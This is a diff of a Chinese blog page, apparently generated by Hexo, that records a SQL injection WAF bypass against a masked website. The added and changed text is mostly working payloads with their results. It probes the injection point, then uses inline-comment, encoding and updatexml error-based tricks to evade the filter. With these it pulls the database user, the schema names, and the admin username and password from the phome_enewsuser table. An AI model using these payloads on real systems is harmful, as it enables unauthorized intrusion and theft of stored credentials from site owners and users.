@@ -86,18 +86,19 @@
 <meta property="og:site_name" content="PippyBear的博客">
 <meta property="og:description" content="这篇文章是本人在项目中遇到的一个sql注入bypass的纪录。 目标站点：https://www.xxx.com/注入点：https://www.xxx.com/include/ty/view_score.php?newsid=28671&amp;amp;classid=884 判断注入点1newsid=28671&apos;&amp;amp;classid=884   进一步判断 123&apos;and 1=1 //报错&apos;and">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/.com//1.png">
-<meta property="og:image" content="http://yoursite.com/.com//3.png">
-<meta property="og:image" content="http://yoursite.com/.com//4.png">
-<meta property="og:image" content="http://yoursite.com/.com//5.png">
-<meta property="og:image" content="http://yoursite.com/.com//6.png">
-<meta property="og:image" content="http://yoursite.com/.com//7.png">
-<meta property="og:image" content="http://yoursite.com/.com//8.png">
-<meta property="og:updated_time" content="2019-07-11T16:46:09.193Z">
+<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/8.png">
+<meta property="og:updated_time" content="2019-07-12T13:22:02.410Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="纪录项目中一次简单的SQL注入bypass">
 <meta name="twitter:description" content="这篇文章是本人在项目中遇到的一个sql注入bypass的纪录。 目标站点：https://www.xxx.com/注入点：https://www.xxx.com/include/ty/view_score.php?newsid=28671&amp;amp;classid=884 判断注入点1newsid=28671&apos;&amp;amp;classid=884   进一步判断 123&apos;and 1=1 //报错&apos;and">
-<meta name="twitter:image" content="http://yoursite.com/.com//1.png">
+<meta name="twitter:image" content="http://yoursite.com/2019/07/12/job-first-bypass/1.png">
 
 
 
@@ -382,12 +383,27 @@
 <p>目标站点：<a href="https://www.xxx.com/" target="_blank" rel="noopener">https://www.xxx.com/</a><br>注入点：<a href="https://www.xxx.com/include/ty/view_score.php?newsid=28671&amp;classid=884" target="_blank" rel="noopener">https://www.xxx.com/include/ty/view_score.php?newsid=28671&amp;classid=884</a></p>
 <h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newsid=28671<span class="string">'&amp;classid=884</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//1.png" alt></p>
+<p><img src="/2019/07/12/job-first-bypass/1.png" alt></p>
 <p>进一步判断</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and 1=1 //报错</span></span><br><span class="line"><span class="string">'</span>and 1=<span class="string">'1 //不报错</span></span><br><span class="line"><span class="string">'</span>and <span class="string">'1'</span>=<span class="string">'1 //不报错</span></span><br></pre></td></tr></table></figure>
 
 <p>最终确定了这是一个注入点</p>
-<h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><h3 id="获取当前用户"><a href="#获取当前用户" class="headerlink" title="获取当前用户"></a>获取当前用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and updatexml(1,concat(0x3a,(select user())),1) //被拦截</span></span><br><span class="line"><span class="string">'</span>and updatexml() //不拦截</span><br><span class="line"><span class="string">'and updatexml(1,concat(),1)//拦截</span></span><br><span class="line"><span class="string">'</span>and updatexml(1,con%a0cat(),1)//不拦截，但是报错</span><br><span class="line"><span class="string">'and updatexml(1,con%00cat(),1)// 不拦截，但是报错</span></span><br><span class="line"><span class="string">'</span>and updatexml(1,con%0acat(),1) // 不拦截，但是报错</span><br><span class="line"><span class="string">'and updatexml(1,/*!concat*/(),1)//不拦截，不报错</span></span><br></pre></td></tr></table></figure>
+<h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><p>按照常规的思路，准备先order by爆一下字段，然后在逐步爆库、表以及用户信息。</p>
+<h3 id="常规思路注入"><a href="#常规思路注入" class="headerlink" title="常规思路注入"></a>常规思路注入</h3><p>先手order by</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'order by 10--+ //Unknown column '</span>10<span class="string">' in '</span>order clause<span class="string">'1054</span></span><br><span class="line"><span class="string">'</span>order by 2--+ //Unknown column <span class="string">'2'</span> <span class="keyword">in</span> <span class="string">'order clause'</span>1054</span><br><span class="line"><span class="string">'order by 1--+ //成功</span></span><br></pre></td></tr></table></figure>
+
+<p>说明只有1个字段，继续进行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'union select user()--+ //拦截</span></span><br><span class="line"><span class="string">'</span>union--+ //不拦截</span><br><span class="line"><span class="string">'union user()--+ //不拦截</span></span><br></pre></td></tr></table></figure>
+
+<p>这里猜测拦截了select</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'union /*!select*/ user()--+ //拦截</span></span><br><span class="line"><span class="string">'</span>union sElect user()--+ //拦截</span><br><span class="line"><span class="string">'union sel%0aect user()--+ //不拦截，但是报错</span></span><br><span class="line"><span class="string">'</span>union sel%0aect user()--+ //不拦截，但是报错</span><br><span class="line"><span class="string">'union sel/**/ect user()--+ //不拦截吗，但是报错</span></span><br></pre></td></tr></table></figure>
+
+<p>emmmmm，到这里我已经绝望了，不得不说这后端处理写的对于我这种新手来说是真的凶残。自顾自的看了一会注入的文章，忽然发现可以采用updatexml报错注入，立刻又开始。</p>
+<p>稍稍普及一下updatexml报错注入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br></pre></td></tr></table></figure>
+
+<p>官方的东西可能说的不太接地气，直接操作一波大家就知道有什么作用了。<br><img src="/2019/07/12/job-first-bypass/2.png" alt><br>大概就是concat将datbase(),user()等返回信息字符串化，然后因为updatexml的第二个参数需要Xpath格式的字符串,所以不符合要求，返回报错信息。</p>
+<h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><h4 id="获取当前用户"><a href="#获取当前用户" class="headerlink" title="获取当前用户"></a>获取当前用户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and updatexml(1,concat(0x3a,(select user())),1) //被拦截</span></span><br><span class="line"><span class="string">'</span>and updatexml() //不拦截</span><br><span class="line"><span class="string">'and updatexml(1,concat(),1)//拦截</span></span><br><span class="line"><span class="string">'</span>and updatexml(1,con%a0cat(),1)//不拦截，但是报错</span><br><span class="line"><span class="string">'and updatexml(1,con%00cat(),1)// 不拦截，但是报错</span></span><br><span class="line"><span class="string">'</span>and updatexml(1,con%0acat(),1) // 不拦截，但是报错</span><br><span class="line"><span class="string">'and updatexml(1,/*!concat*/(),1)//不拦截，不报错</span></span><br></pre></td></tr></table></figure>
 
 <p>通过以上步骤推论waf拦截concant()函数，继续进行。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and updatexml(1,/*!concat*/(0x3a,(select user())),1)//拦截</span></span><br><span class="line"><span class="string">'</span>and updatexml(1,/*!concat*/(0x3a,(select)),1)//拦截</span><br><span class="line"><span class="string">'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) // 不拦截</span></span><br></pre></td></tr></table></figure>
@@ -395,24 +411,24 @@
 <p>通过以上步骤推论waf还拦截了select，继续进行。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1)--+ //发现页面不响应</span></span><br><span class="line"><span class="string">'</span>and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) and <span class="string">'//拦截</span></span><br><span class="line"><span class="string">'</span>and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) /*!and*/ <span class="string">' 成功</span></span><br><span class="line"><span class="string">'</span>and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1)--+//成功</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//3.png" alt></p>
-<h3 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ database())),1)--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/12/job-first-bypass/3.png" alt></p>
+<h4 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ database())),1)--+</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//4.png" alt><br>获取到当前数据库和用户后，继续按照常规思路，爆库、爆表、爆字段。</p>
-<h3 id="爆库、爆表、爆字段"><a href="#爆库、爆表、爆字段" class="headerlink" title="爆库、爆表、爆字段"></a>爆库、爆表、爆字段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ schema_name from information_schema.schemata limit 0,1)),1)--+ //拦截</span></span><br><span class="line"><span class="string">'</span>and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ schema_name from /*!information_schema.schemata*/ <span class="built_in">limit</span> 0,1)),1)--+//拦截</span><br><span class="line"><span class="string">'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/schema_name from /*!information0x5fschema.schemata*/ limit 0,1)),1)--+    //成功</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/12/job-first-bypass/4.png" alt><br>获取到当前数据库和用户后，继续按照常规思路，爆库、爆表、爆字段。</p>
+<h4 id="爆库、爆表、爆字段"><a href="#爆库、爆表、爆字段" class="headerlink" title="爆库、爆表、爆字段"></a>爆库、爆表、爆字段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ schema_name from information_schema.schemata limit 0,1)),1)--+ //拦截</span></span><br><span class="line"><span class="string">'</span>and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ schema_name from /*!information_schema.schemata*/ <span class="built_in">limit</span> 0,1)),1)--+//拦截</span><br><span class="line"><span class="string">'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/schema_name from /*!information0x5fschema.schemata*/ limit 0,1)),1)--+    //成功</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//5.png" alt></p>
+<p><img src="/2019/07/12/job-first-bypass/5.png" alt></p>
 <p>虽然执行成功，但似乎限制了权限。思考了很久，正准备放弃的时候，同站点另外一个注入点吸引了我。</p>
-<p><img src="/.com//6.png" alt></p>
+<p><img src="/2019/07/12/job-first-bypass/6.png" alt></p>
 <p>这里报错直接把sql语句给提示出来了，刚刚好有我们需要的表信息，二话不说，进一步尝试。</p>
 <p>直接按照之前bypass的特点，一步到位。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ username from phome_enewsuser limit 0,1)),1)--+&amp;classid=834</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//7.png" alt></p>
+<p><img src="/2019/07/12/job-first-bypass/7.png" alt></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ password from phome_enewsuser limit 0,1)),1)--+&amp;classid=834</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//8.png" alt></p>
-<p>##总结</p>
+<p><img src="/2019/07/12/job-first-bypass/8.png" alt></p>
+<p>总结</p>
 <p>任何时候都不要放弃尝试，说不定试着试着就出来了。</p>
 <p>推荐阅读：<br>我的WafBypass之道（SQL注入篇）<br><a href="http://www.moonsec.com/post-299.html" target="_blank" rel="noopener">http://www.moonsec.com/post-299.html</a></p>
 
@@ -587,7 +603,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#判断注入点"><span class="nav-number">1.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取信息"><span class="nav-number">2.</span> <span class="nav-text">获取信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取当前用户"><span class="nav-number">2.1.</span> <span class="nav-text">获取当前用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取当前数据库"><span class="nav-number">2.2.</span> <span class="nav-text">获取当前数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆库、爆表、爆字段"><span class="nav-number">2.3.</span> <span class="nav-text">爆库、爆表、爆字段</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#判断注入点"><span class="nav-number">1.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取信息"><span class="nav-number">2.</span> <span class="nav-text">获取信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常规思路注入"><span class="nav-number">2.1.</span> <span class="nav-text">常规思路注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#updatexml报错注入"><span class="nav-number">2.2.</span> <span class="nav-text">updatexml报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#获取当前用户"><span class="nav-number">2.2.1.</span> <span class="nav-text">获取当前用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取当前数据库"><span class="nav-number">2.2.2.</span> <span class="nav-text">获取当前数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爆库、爆表、爆字段"><span class="nav-number">2.2.3.</span> <span class="nav-text">爆库、爆表、爆字段</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
